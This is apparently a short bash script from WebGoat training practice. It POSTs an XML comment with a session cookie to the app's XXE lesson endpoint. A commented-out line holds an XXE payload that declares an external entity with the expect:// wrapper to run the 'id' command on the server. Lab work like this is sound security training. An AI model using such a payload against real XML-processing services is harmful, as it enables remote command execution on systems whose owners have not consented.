#!/bin/bash

curl -v -L --request POST \
--header "Content-Type: application/xml" \
--header "Content-length: 127" \
--header "Cookie: JSESSIONID=wmDZCgLVTLix1Mpf2HUkkz0zVfsRekrDjsUFpn0Y" \
--data '<?xml version="1.0"?><comment><text>This is my first comment, nice picture</text></comment>' \
https://web-goat-dev-6y377xz4cq-as.a.run.app/WebGoat/xxe/simple

#--data '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "expect://id" >]><user>&xxe;</user>' \

